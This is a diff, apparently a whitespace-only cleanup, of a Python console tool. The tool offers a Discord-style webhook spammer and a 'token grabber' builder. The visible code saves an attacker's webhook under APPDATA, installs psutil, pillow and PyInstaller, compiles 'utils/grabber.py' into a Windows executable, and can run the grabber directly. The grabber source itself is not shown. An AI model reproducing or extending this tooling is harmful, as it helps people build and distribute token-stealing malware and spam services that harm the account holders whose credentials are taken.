@@ -68,13 +68,11 @@ def check_for_update():
 def rgb(r, g, b):
     return f'\033[38;2;{r};{g};{b}m'
 
-
 def get_terminal_width():
     try:
         return shutil.get_terminal_size().columns
     except Exception:
         return 80
-
 
 def center(text):
     try:
@@ -101,10 +99,10 @@ def get_grbr_webhook():
 def save_grbr_webhook(webhook_url):
     storage_path = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
     config_path = os.path.join(storage_path, 'config.json')
-    
+
     if not os.path.exists(storage_path):
         os.makedirs(storage_path)
-    
+
     config = {}
     if os.path.exists(config_path):
         try:
@@ -112,12 +110,12 @@ def save_grbr_webhook(webhook_url):
                 config = json.load(f)
         except Exception:
             pass
-    
+
     config['webhook'] = webhook_url
-    
+
     with open(config_path, 'w', encoding='utf-8') as f:
         json.dump(config, f)
-    
+
     return True
 
 def show_webhook_box():
@@ -127,7 +125,7 @@ def show_webhook_box():
         status = "Webhook Set"
     else:
         status = "No Webhook Set"
-    
+
     print(text_color + center(status) + RESET)
     print()
 
@@ -143,11 +141,9 @@ BANNER = [
 status_message = "Waiting for input..."
 active_webhook = None
 
-
 def show_status():
     color = rgb(0, 200, 255)
     print(color + center(f"Status: {status_message}") + RESET)
-
 
 def print_banner(show_webhook=False):
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -167,7 +163,6 @@ def print_banner(show_webhook=False):
         show_webhook_box()
     print()
 
-
 def pretty_print(text, color=(255,64,64), newline=True):
     ansi = rgb(*color)
     line = center(text)
@@ -176,12 +171,10 @@ def pretty_print(text, color=(255,64,64), newline=True):
     else:
         print(ansi + line + RESET, end='')
 
-
 def debug_info(text, indent=6, color=(180,180,180)):
     ansi = rgb(*color)
     prefix = " " * indent + "[DEBUG] "
     print(ansi + prefix + text + RESET)
-
 
 def debug_json(data, indent=6, color=(180,180,180)):
     ansi = rgb(*color)
@@ -194,7 +187,6 @@ def debug_json(data, indent=6, color=(180,180,180)):
     except Exception:
         print(ansi + prefix + data + RESET)
 
-
 def loading_spinner():
     frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
     for frame in frames:
@@ -202,7 +194,6 @@ def loading_spinner():
         sys.stdout.flush()
         time.sleep(0.08)
     print()
-
 
 def get_multiline_input(prompt):
     print(center(prompt + " (Finish with an empty line):"))
@@ -217,12 +208,10 @@ def get_multiline_input(prompt):
         lines.append(line.strip())
     return "".join(lines).replace('\n', '').replace('\r', '').strip()
 
-
 def clean_singleline_input_left(prompt):
     raw = input(prompt)
     cleaned = "".join(raw.split())
     return cleaned
-
 
 def ask_webhook():
     global active_webhook, status_message
@@ -237,7 +226,6 @@ def ask_webhook():
         status_message = "No webhook entered."
         return None
 
-
 def ask_message():
     global status_message
     status_message = "Waiting for message input..."
@@ -249,7 +237,6 @@ def ask_message():
     else:
         status_message = "No message entered."
         return None
-
 
 def ask_amount_and_interval():
     global status_message
@@ -266,7 +253,6 @@ def ask_amount_and_interval():
                 pretty_print("Please enter a positive amount and a non-negative interval.", (255,64,64))
         except Exception:
             pretty_print("Invalid input. Please enter numbers only.", (255,64,64))
-
 
 def send_to_webhook(webhook_url, message, tts=False, debug=False):
     global status_message
@@ -305,7 +291,6 @@ def send_to_webhook(webhook_url, message, tts=False, debug=False):
         status_message = f"Error: {str(e)}"
         pretty_print(f"✗ Error: {str(e)}", (192,0,0))
     return None
-
 
 def webhook_spammer_menu():
     print_banner()
@@ -422,31 +407,31 @@ def compile_grabber_menu():
         status_message = "No grabber webhook set!"
         pretty_print("✗ You need to set a grabber webhook first!", (255,0,0))
         return
-    
+
     pretty_print("This will compile the token grabber into an executable (.exe) file", (255,128,0))
     compile_confirmation = input(rgb(255,32,32) + center("Do you want to continue? (y/n): ") + RESET).lower()
-    
+
     if compile_confirmation != 'y':
         status_message = "Compilation cancelled."
         pretty_print("Compilation cancelled.", (255,64,64))
         return
-    
+
     missing_deps = []
     try:
         __import__('psutil')
     except ImportError:
         missing_deps.append("psutil")
-    
+
     try:
         __import__('PIL')
     except ImportError:
         missing_deps.append("pillow")
-    
+
     try:
         __import__('sqlite3')
     except ImportError:
         missing_deps.append("pysqlite3")
-    
+
     if missing_deps:
         status_message = "Installing required dependencies..."
         print_banner()
@@ -459,26 +444,26 @@ def compile_grabber_menu():
                 pretty_print(f"✗ Failed to install {dep}", (255,0,0))
                 status_message = "Failed to install dependencies."
                 return
-    
+
     status_message = "Compiling grabber to .exe..."
     print_banner()
     pretty_print("Compiling token grabber to .exe...", (255,128,0))
-    
+
     try:
         check_cmd = [sys.executable, '-m', 'pip', 'show', 'pyinstaller']
         result = subprocess.run(check_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
+
         if result.returncode != 0:
             pretty_print("PyInstaller not found. Installing PyInstaller...", (255,128,0))
             install_cmd = [sys.executable, '-m', 'pip', 'install', 'pyinstaller']
             subprocess.run(install_cmd, check=True)
-        
+
         loading_spinner()
-        
+
         output_dir = os.path.join(os.getcwd(), 'compiled')
         if not os.path.exists(output_dir):
             os.makedirs(output_dir)
-        
+
         pretty_print("Building executable with PyInstaller...", (255,128,0))
         compile_cmd = [
             sys.executable, '-m', 'PyInstaller',
@@ -494,9 +479,9 @@ def compile_grabber_menu():
             '--hidden-import=sqlite3',
             'utils/grabber.py'
         ]
-        
+
         subprocess.run(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
+
         status_message = "Grabber compiled successfully!"
         print_banner()
         pretty_print("✓ Token grabber compiled successfully!", (0,255,0))
@@ -521,7 +506,7 @@ def grabber_menu():
         answers = inquirer.prompt(questions)
         if not answers or answers['choice'] == 'Back to Main Menu':
             break
-            
+
         if answers['choice'] == 'Set Webhook':
             set_grabber_webhook_menu()
         elif answers['choice'] == 'Compile to EXE':
@@ -531,7 +516,7 @@ def grabber_menu():
                 print_banner()
                 pretty_print("No webhook set! Please set a webhook first.", (255,0,0))
                 continue
-                
+
             print_banner()
             pretty_print("Running token grabber...", (255,128,0))
             loading_spinner()
@@ -540,7 +525,7 @@ def grabber_menu():
                 pretty_print("✓ Token grabber executed successfully!", (0,255,0))
             else:
                 pretty_print("✗ Token grabber failed to execute. Check your webhook configuration.", (255,0,0))
-            
+
         questions = [
             inquirer.List('continue',
                         message="Return to Grabber menu?",
@@ -651,4 +636,4 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"\n{Fore.RED}An unexpected error occurred: {str(e)}{Style.RESET_ALL}")
     finally:
-        sys.exit(0) 
+        sys.exit(0)
